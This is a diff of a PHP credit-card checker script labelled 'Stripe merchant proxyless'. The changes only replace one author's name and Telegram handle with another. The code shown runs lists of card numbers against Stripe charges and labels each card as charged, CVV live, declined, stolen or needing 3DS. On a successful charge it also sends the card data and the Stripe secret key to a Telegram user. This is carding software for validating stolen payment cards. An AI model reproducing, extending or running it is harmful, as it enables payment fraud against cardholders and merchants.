@@ -1,7 +1,7 @@
 <?php
 
 
-//===================== [ MADE BY MotuPatlu ] ====================//
+//===================== [ MADE BY Cyberxbd ] ====================//
 #---------------[ STRIPE MERCHANTE PROXYLESS ]----------------#
 
 
@@ -156,11 +156,11 @@ $receipturl = trim(strip_tags(getStr($result3,'"receipt_url": "','"')));
 //=================== [ RESPONSES ] ===================//
 
 if(strpos($result3, '"seller_message": "Payment complete."' )) {
-    echo '|𝘾𝙃𝘼𝙍𝙂𝙀𝘿</span>  </span>𝘾𝙑𝙑:  '.$lista.'</span>  <br>|➤ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: $'.$amt.' Charged ✅ |𝘾𝙝𝙚𝙘𝙠𝙚𝙧 𝗕𝗬 <a href="https://t.me/MotuSamusa" class="link">@MotuSamusa</a> <br> |➤ 𝙍𝙚𝙘𝙚𝙞𝙥𝙩: <a href='.$receipturl.'>Here</a><br>|➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'<br> <br>';
-	send_message($userid, "<b>𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 CC :</b> <code>$lista</code>\n<b>SK ➔<code>$sk</code></b>\n<b>RESPONSE : CCN </b>\n<b>CHARGED : 1$ ✅</b>\n<b>BY ➔ @MotuSamusa</b>");
+    echo '|𝘾𝙃𝘼𝙍𝙂𝙀𝘿</span>  </span>𝘾𝙑𝙑:  '.$lista.'</span>  <br>|➤ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: $'.$amt.' Charged ✅ |𝘾𝙝𝙚𝙘𝙠𝙚𝙧 𝗕𝗬 <a href="https://t.me/MotuSamusa" class="link">@CyberXBD</a> <br> |➤ 𝙍𝙚𝙘𝙚𝙞𝙥𝙩: <a href='.$receipturl.'>Here</a><br>|➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'<br> <br>';
+	send_message($userid, "<b>𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 CC :</b> <code>$lista</code>\n<b>SK ➔<code>$sk</code></b>\n<b>RESPONSE : CCN </b>\n<b>CHARGED : 1$ ✅</b>\n<b>BY ➔ @CyberXBD</b>");
 }
 elseif(strpos($result2,'"cvc_check": "pass"')){
-    echo '|𝘾𝙑𝙑</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: CVV LIVE @MotuSamusa <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
+    echo '|𝘾𝙑𝙑</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: CVV LIVE @CyberXBD <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
 }
 
 
@@ -171,7 +171,7 @@ elseif(strpos($result2, "generic_decline" )) {
     echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:   '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: GENERIC DECLINED<br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.' </span><br>';
 }
 elseif(strpos($result2, "insufficient_funds" )) {
-    echo '|𝘾𝙑𝙑</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: INSUFFICIENT FUNDS @MotuSamusa <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
+    echo '|𝘾𝙑𝙑</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: INSUFFICIENT FUNDS @CyberXBD <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
 }
 
 elseif(strpos($result2, "fraudulent" )) {
@@ -189,10 +189,10 @@ elseif(strpos($result,"fraudulent")){
 }
 
 elseif(strpos($result2,'"code": "incorrect_cvc"')){
-    echo '|𝘾𝘾𝙉</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: Security code is incorrect @MotuSamusa <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
+    echo '|𝘾𝘾𝙉</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: Security code is incorrect @CyberXBD <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
 }
 elseif(strpos($result1,' "code": "invalid_cvc"')){
-    echo '|𝘾𝘾𝙉</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: Security code is incorrect @MotuSamusa <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
+    echo '|𝘾𝘾𝙉</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: Security code is incorrect @CyberXBD <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
      
 }
 elseif(strpos($result1,"invalid_expiry_month")){
@@ -211,7 +211,7 @@ elseif(strpos($result2, "lost_card" )) {
     echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: LOST CARD<br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.' </span><br>';
 }
 elseif(strpos($result2, "lost_card" )) {
-    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: LOST CARD</span></span>  <br>Result: CHECKER BY @MotuSamusa <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span> <br>';
+    echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: LOST CARD</span></span>  <br>Result: CHECKER BY @CyberXBD <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span> <br>';
 }
 
 elseif(strpos($result2, "stolen_card" )) {
@@ -224,22 +224,22 @@ elseif(strpos($result2, "stolen_card" )) {
 
 }
 elseif(strpos($result2, "transaction_not_allowed" )) {
-    echo '|𝘾𝙑𝙑</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: TRANSACTION NOT ALLOWED @MotuSamusa <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
+    echo '|𝘾𝙑𝙑</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: TRANSACTION NOT ALLOWED @CyberXBD <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
     }
     elseif(strpos($result2, "authentication_required")) {
-    	echo '|𝘾𝙑𝙑</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: 32DS REQUIRED @MotuSamusa <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
+    	echo '|𝘾𝙑𝙑</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: 32DS REQUIRED @CyberXBD <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
    } 
    elseif(strpos($result2, "card_error_authentication_required")) {
-    	echo '|𝘾𝙑𝙑</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: 32DS REQUIRED @MotuSamusa <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
+    	echo '|𝘾𝙑𝙑</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: 32DS REQUIRED @CyberXBD <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
    } 
    elseif(strpos($result2, "card_error_authentication_required")) {
-    	echo '|𝘾𝙑𝙑</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: 32DS REQUIRED @MotuSamusa <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
+    	echo '|𝘾𝙑𝙑</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: 32DS REQUIRED @CyberXBD <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
    } 
    elseif(strpos($result1, "card_error_authentication_required")) {
-    	echo '|𝘾𝙑𝙑</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: 32DS REQUIRED @MotuSamusa <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
+    	echo '|𝘾𝙑𝙑</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: 32DS REQUIRED @CyberXBD <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
    } 
 elseif(strpos($result2, "incorrect_cvc" )) {
-    echo '|𝘾𝙑𝙑</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: Security code is incorrect @MotuSamusa <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
+    echo '|𝘾𝙑𝙑</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: Security code is incorrect @CyberXBD <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
 }
 elseif(strpos($result2, "pickup_card" )) {
     echo '|𝘿??𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: PICKUP CARD <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
@@ -332,7 +332,7 @@ elseif (strpos($result,'Your card does not support this type of purchase.')) {
     }
 
 elseif(strpos($result2,'"cvc_check": "pass"')){
-    echo '|𝘾𝙑𝙑</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: CVV LIVE @MotuSamusa <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
+    echo '|𝘾𝙑𝙑</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: CVV LIVE @CyberXBD <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
 }
 elseif(strpos($result2, "fraudulent" )) {
     echo '|𝘿𝙀𝘼𝘿</span>  </span>𝘾𝘾:  '.$lista.'</span>  <br>|➤𝙍𝙀𝙎𝙐𝙇𝙏: FRAUDULENT <br> |➤ 𝘽𝙔𝙋𝘼𝙎𝙎𝙄𝙉𝙂: '.$x.'</span><br>';
